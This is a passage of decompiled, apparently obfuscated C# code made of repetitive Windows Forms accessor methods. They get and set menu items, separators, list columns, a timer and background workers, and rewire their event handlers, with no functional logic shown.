	// Token: 0x06001426 RID: 5158 RVA: 0x0000ACA2 File Offset: 0x00008EA2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_0 = toolStripSeparator_24;
	}

	// Token: 0x06001427 RID: 5159 RVA: 0x0000ACAB File Offset: 0x00008EAB
	internal ToolStripMenuItem vmethod_64()
	{
		return this.toolStripMenuItem_8;
	}

	// Token: 0x06001428 RID: 5160 RVA: 0x000A4BE8 File Offset: 0x000A2DE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_51);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_8 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001429 RID: 5161 RVA: 0x0000ACB3 File Offset: 0x00008EB3
	internal ToolStripMenuItem vmethod_66()
	{
		return this.toolStripMenuItem_9;
	}

	// Token: 0x0600142A RID: 5162 RVA: 0x0000ACBB File Offset: 0x00008EBB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_9 = toolStripMenuItem_66;
	}

	// Token: 0x0600142B RID: 5163 RVA: 0x0000ACC4 File Offset: 0x00008EC4
	internal ToolStripSeparator vmethod_68()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x0600142C RID: 5164 RVA: 0x0000ACCC File Offset: 0x00008ECC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_1 = toolStripSeparator_24;
	}

	// Token: 0x0600142D RID: 5165 RVA: 0x0000ACD5 File Offset: 0x00008ED5
	internal ToolStripMenuItem vmethod_70()
	{
		return this.toolStripMenuItem_10;
	}

	// Token: 0x0600142E RID: 5166 RVA: 0x0000ACDD File Offset: 0x00008EDD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_10 = toolStripMenuItem_66;
	}

	// Token: 0x0600142F RID: 5167 RVA: 0x0000ACE6 File Offset: 0x00008EE6
	internal ToolStripMenuItem vmethod_72()
	{
		return this.toolStripMenuItem_11;
	}

	// Token: 0x06001430 RID: 5168 RVA: 0x000A4C2C File Offset: 0x000A2E2C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_53);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_11 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001431 RID: 5169 RVA: 0x0000ACEE File Offset: 0x00008EEE
	internal ToolStripSeparator vmethod_74()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06001432 RID: 5170 RVA: 0x0000ACF6 File Offset: 0x00008EF6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_2 = toolStripSeparator_24;
	}

	// Token: 0x06001433 RID: 5171 RVA: 0x0000ACFF File Offset: 0x00008EFF
	internal ToolStripMenuItem vmethod_76()
	{
		return this.toolStripMenuItem_12;
	}

	// Token: 0x06001434 RID: 5172 RVA: 0x000A4C70 File Offset: 0x000A2E70
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_56);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_12 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001435 RID: 5173 RVA: 0x0000AD07 File Offset: 0x00008F07
	internal ToolStripMenuItem vmethod_78()
	{
		return this.toolStripMenuItem_13;
	}

	// Token: 0x06001436 RID: 5174 RVA: 0x0000AD0F File Offset: 0x00008F0F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_13 = toolStripMenuItem_66;
	}

	// Token: 0x06001437 RID: 5175 RVA: 0x0000AD18 File Offset: 0x00008F18
	internal ToolStripMenuItem vmethod_80()
	{
		return this.toolStripMenuItem_14;
	}

	// Token: 0x06001438 RID: 5176 RVA: 0x000A4CB4 File Offset: 0x000A2EB4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_59);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_14 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001439 RID: 5177 RVA: 0x0000AD20 File Offset: 0x00008F20
	internal OLVColumn vmethod_82()
	{
		return this.olvcolumn_12;
	}

	// Token: 0x0600143A RID: 5178 RVA: 0x0000AD28 File Offset: 0x00008F28
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_12 = olvcolumn_19;
	}

	// Token: 0x0600143B RID: 5179 RVA: 0x0000AD31 File Offset: 0x00008F31
	internal ToolStripMenuItem vmethod_84()
	{
		return this.toolStripMenuItem_15;
	}

	// Token: 0x0600143C RID: 5180 RVA: 0x000A4CF8 File Offset: 0x000A2EF8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_60);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_15 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600143D RID: 5181 RVA: 0x0000AD39 File Offset: 0x00008F39
	internal ToolStripSeparator vmethod_86()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x0600143E RID: 5182 RVA: 0x0000AD41 File Offset: 0x00008F41
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_3 = toolStripSeparator_24;
	}

	// Token: 0x0600143F RID: 5183 RVA: 0x0000AD4A File Offset: 0x00008F4A
	internal OLVColumn vmethod_88()
	{
		return this.olvcolumn_13;
	}

	// Token: 0x06001440 RID: 5184 RVA: 0x0000AD52 File Offset: 0x00008F52
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_13 = olvcolumn_19;
	}

	// Token: 0x06001441 RID: 5185 RVA: 0x0000AD5B File Offset: 0x00008F5B
	internal System.Windows.Forms.Timer vmethod_90()
	{
		return this.timer_0;
	}

	// Token: 0x06001442 RID: 5186 RVA: 0x000A4D3C File Offset: 0x000A2F3C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_63);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_2;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06001443 RID: 5187 RVA: 0x0000AD63 File Offset: 0x00008F63
	internal ZeroitWin8ProgressRing vmethod_92()
	{
		return this.zeroitWin8ProgressRing_0;
	}

	// Token: 0x06001444 RID: 5188 RVA: 0x0000AD6B File Offset: 0x00008F6B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(ZeroitWin8ProgressRing zeroitWin8ProgressRing_1)
	{
		this.zeroitWin8ProgressRing_0 = zeroitWin8ProgressRing_1;
	}

	// Token: 0x06001445 RID: 5189 RVA: 0x0000AD74 File Offset: 0x00008F74
	internal OLVColumn vmethod_94()
	{
		return this.olvcolumn_14;
	}

	// Token: 0x06001446 RID: 5190 RVA: 0x0000AD7C File Offset: 0x00008F7C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_14 = olvcolumn_19;
	}

	// Token: 0x06001447 RID: 5191 RVA: 0x0000AD85 File Offset: 0x00008F85
	internal OLVColumn vmethod_96()
	{
		return this.olvcolumn_15;
	}

	// Token: 0x06001448 RID: 5192 RVA: 0x0000AD8D File Offset: 0x00008F8D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_15 = olvcolumn_19;
	}

	// Token: 0x06001449 RID: 5193 RVA: 0x0000AD96 File Offset: 0x00008F96
	internal BackgroundWorker vmethod_98()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x0600144A RID: 5194 RVA: 0x000A4D80 File Offset: 0x000A2F80
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_73);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600144B RID: 5195 RVA: 0x0000AD9E File Offset: 0x00008F9E
	internal BackgroundWorker vmethod_100()
	{
		return this.backgroundWorker_1;
	}

	// Token: 0x0600144C RID: 5196 RVA: 0x000A4DC4 File Offset: 0x000A2FC4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_68);
		BackgroundWorker backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_1 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600144D RID: 5197 RVA: 0x0000ADA6 File Offset: 0x00008FA6
	internal BackgroundWorker vmethod_102()
	{
		return this.backgroundWorker_2;
	}

	// Token: 0x0600144E RID: 5198 RVA: 0x000A4E08 File Offset: 0x000A3008
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_74);
		BackgroundWorker backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_2 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600144F RID: 5199 RVA: 0x0000ADAE File Offset: 0x00008FAE
	internal ToolStripMenuItem vmethod_104()
	{
		return this.toolStripMenuItem_16;
	}

	// Token: 0x06001450 RID: 5200 RVA: 0x0000ADB6 File Offset: 0x00008FB6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_16 = toolStripMenuItem_66;
	}

	// Token: 0x06001451 RID: 5201 RVA: 0x0000ADBF File Offset: 0x00008FBF
	internal ToolStripMenuItem vmethod_106()
	{
		return this.toolStripMenuItem_17;
	}

	// Token: 0x06001452 RID: 5202 RVA: 0x000A4E4C File Offset: 0x000A304C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_75);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_17 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001453 RID: 5203 RVA: 0x0000ADC7 File Offset: 0x00008FC7
	internal ToolStripSeparator vmethod_108()
	{
		return this.toolStripSeparator_4;
	}

	// Token: 0x06001454 RID: 5204 RVA: 0x0000ADCF File Offset: 0x00008FCF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_4 = toolStripSeparator_24;
	}

	// Token: 0x06001455 RID: 5205 RVA: 0x0000ADD8 File Offset: 0x00008FD8
	internal ToolStripMenuItem vmethod_110()
	{
		return this.toolStripMenuItem_18;
	}

	// Token: 0x06001456 RID: 5206 RVA: 0x000A4E90 File Offset: 0x000A3090
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_76);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_18 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001457 RID: 5207 RVA: 0x0000ADE0 File Offset: 0x00008FE0
	internal ToolStripMenuItem vmethod_112()
	{
		return this.toolStripMenuItem_19;
	}

	// Token: 0x06001458 RID: 5208 RVA: 0x0000ADE8 File Offset: 0x00008FE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_19 = toolStripMenuItem_66;
	}

	// Token: 0x06001459 RID: 5209 RVA: 0x0000ADF1 File Offset: 0x00008FF1
	internal ToolStripMenuItem vmethod_114()
	{
		return this.toolStripMenuItem_20;
	}

	// Token: 0x0600145A RID: 5210 RVA: 0x000A4ED4 File Offset: 0x000A30D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_78);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_20 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600145B RID: 5211 RVA: 0x0000ADF9 File Offset: 0x00008FF9
	internal ToolStripMenuItem vmethod_116()
	{
		return this.toolStripMenuItem_21;
	}

	// Token: 0x0600145C RID: 5212 RVA: 0x0000AE01 File Offset: 0x00009001
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_117(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_21 = toolStripMenuItem_66;
	}

	// Token: 0x0600145D RID: 5213 RVA: 0x0000AE0A File Offset: 0x0000900A
	internal ToolStripMenuItem vmethod_118()
	{
		return this.toolStripMenuItem_22;
	}

	// Token: 0x0600145E RID: 5214 RVA: 0x000A4F18 File Offset: 0x000A3118
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_119(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_79);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_22 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600145F RID: 5215 RVA: 0x0000AE12 File Offset: 0x00009012
	internal ToolStripSeparator vmethod_120()
	{
		return this.toolStripSeparator_5;
	}

	// Token: 0x06001460 RID: 5216 RVA: 0x0000AE1A File Offset: 0x0000901A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_121(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_5 = toolStripSeparator_24;
	}

	// Token: 0x06001461 RID: 5217 RVA: 0x0000AE23 File Offset: 0x00009023
	internal ToolStripSeparator vmethod_122()
	{
		return this.toolStripSeparator_6;
	}

	// Token: 0x06001462 RID: 5218 RVA: 0x0000AE2B File Offset: 0x0000902B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_123(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_6 = toolStripSeparator_24;
	}

	// Token: 0x06001463 RID: 5219 RVA: 0x0000AE34 File Offset: 0x00009034
	internal ToolStripMenuItem vmethod_124()
	{
		return this.toolStripMenuItem_23;
	}

	// Token: 0x06001464 RID: 5220 RVA: 0x000A4F5C File Offset: 0x000A315C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_125(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_80);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_23 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001465 RID: 5221 RVA: 0x0000AE3C File Offset: 0x0000903C
	internal ToolStripMenuItem vmethod_126()
	{
		return this.toolStripMenuItem_24;
	}

	// Token: 0x06001466 RID: 5222 RVA: 0x0000AE44 File Offset: 0x00009044
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_127(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_24 = toolStripMenuItem_66;
	}

	// Token: 0x06001467 RID: 5223 RVA: 0x0000AE4D File Offset: 0x0000904D
	internal ToolStripMenuItem vmethod_128()
	{
		return this.toolStripMenuItem_25;
	}

	// Token: 0x06001468 RID: 5224 RVA: 0x000A4FA0 File Offset: 0x000A31A0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_129(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_83);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_25 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001469 RID: 5225 RVA: 0x0000AE55 File Offset: 0x00009055
	internal ToolStripSeparator vmethod_130()
	{
		return this.toolStripSeparator_7;
	}

	// Token: 0x0600146A RID: 5226 RVA: 0x0000AE5D File Offset: 0x0000905D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_131(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_7 = toolStripSeparator_24;
	}

	// Token: 0x0600146B RID: 5227 RVA: 0x0000AE66 File Offset: 0x00009066
	internal ToolStripMenuItem vmethod_132()
	{
		return this.toolStripMenuItem_26;
	}

	// Token: 0x0600146C RID: 5228 RVA: 0x000A4FE4 File Offset: 0x000A31E4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_133(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_84);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_26 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600146D RID: 5229 RVA: 0x0000AE6E File Offset: 0x0000906E
	internal ToolStripMenuItem vmethod_134()
	{
		return this.toolStripMenuItem_27;
	}

	// Token: 0x0600146E RID: 5230 RVA: 0x000A5028 File Offset: 0x000A3228
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_135(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_81);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_27;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_27 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_27;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600146F RID: 5231 RVA: 0x0000AE76 File Offset: 0x00009076
	internal ToolStripMenuItem vmethod_136()
	{
		return this.toolStripMenuItem_28;
	}

	// Token: 0x06001470 RID: 5232 RVA: 0x000A506C File Offset: 0x000A326C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_137(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_82);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_28;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_28 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_28;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001471 RID: 5233 RVA: 0x0000AE7E File Offset: 0x0000907E
	internal ToolStripSeparator vmethod_138()
	{
		return this.toolStripSeparator_8;
	}

	// Token: 0x06001472 RID: 5234 RVA: 0x0000AE86 File Offset: 0x00009086
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_139(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_8 = toolStripSeparator_24;
	}

	// Token: 0x06001473 RID: 5235 RVA: 0x0000AE8F File Offset: 0x0000908F
	internal ToolStripMenuItem vmethod_140()
	{
		return this.toolStripMenuItem_29;
	}

	// Token: 0x06001474 RID: 5236 RVA: 0x000A50B0 File Offset: 0x000A32B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_141(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_85);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_29;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_29 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_29;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001475 RID: 5237 RVA: 0x0000AE97 File Offset: 0x00009097
	internal ToolStripSeparator vmethod_142()
	{
		return this.toolStripSeparator_9;
	}

	// Token: 0x06001476 RID: 5238 RVA: 0x0000AE9F File Offset: 0x0000909F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_143(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_9 = toolStripSeparator_24;
	}

	// Token: 0x06001477 RID: 5239 RVA: 0x0000AEA8 File Offset: 0x000090A8
	internal ToolStripMenuItem vmethod_144()
	{
		return this.toolStripMenuItem_30;
	}

	// Token: 0x06001478 RID: 5240 RVA: 0x000A50F4 File Offset: 0x000A32F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_145(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_86);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_30;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_30 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_30;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001479 RID: 5241 RVA: 0x0000AEB0 File Offset: 0x000090B0
	internal BackgroundWorker vmethod_146()
	{
		return this.backgroundWorker_3;
	}

	// Token: 0x0600147A RID: 5242 RVA: 0x000A5138 File Offset: 0x000A3338
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_147(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_87);
		BackgroundWorker backgroundWorker = this.backgroundWorker_3;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_3 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_3;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600147B RID: 5243 RVA: 0x0000AEB8 File Offset: 0x000090B8
	internal BackgroundWorker vmethod_148()
	{
		return this.backgroundWorker_4;
	}

	// Token: 0x0600147C RID: 5244 RVA: 0x000A517C File Offset: 0x000A337C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_149(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_88);
		BackgroundWorker backgroundWorker = this.backgroundWorker_4;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_4 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_4;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600147D RID: 5245 RVA: 0x0000AEC0 File Offset: 0x000090C0
	internal ToolStripMenuItem vmethod_150()
	{
		return this.toolStripMenuItem_31;
	}

	// Token: 0x0600147E RID: 5246 RVA: 0x000A51C0 File Offset: 0x000A33C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_151(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_89);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_31;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_31 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_31;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600147F RID: 5247 RVA: 0x0000AEC8 File Offset: 0x000090C8
	internal BackgroundWorker vmethod_152()
	{
		return this.backgroundWorker_5;
	}

	// Token: 0x06001480 RID: 5248 RVA: 0x000A5204 File Offset: 0x000A3404
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_153(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_90);
		BackgroundWorker backgroundWorker = this.backgroundWorker_5;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_5 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_5;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001481 RID: 5249 RVA: 0x0000AED0 File Offset: 0x000090D0
	internal BackgroundWorker vmethod_154()
	{
		return this.backgroundWorker_6;
	}

	// Token: 0x06001482 RID: 5250 RVA: 0x000A5248 File Offset: 0x000A3448
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_155(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_91);
		BackgroundWorker backgroundWorker = this.backgroundWorker_6;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_6 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_6;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001483 RID: 5251 RVA: 0x0000AED8 File Offset: 0x000090D8
	internal BackgroundWorker vmethod_156()
	{
		return this.backgroundWorker_7;
	}

	// Token: 0x06001484 RID: 5252 RVA: 0x000A528C File Offset: 0x000A348C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_157(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_92);
		BackgroundWorker backgroundWorker = this.backgroundWorker_7;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_7 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_7;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001485 RID: 5253 RVA: 0x0000AEE0 File Offset: 0x000090E0
	internal ToolStripMenuItem vmethod_158()
	{
		return this.toolStripMenuItem_32;
	}

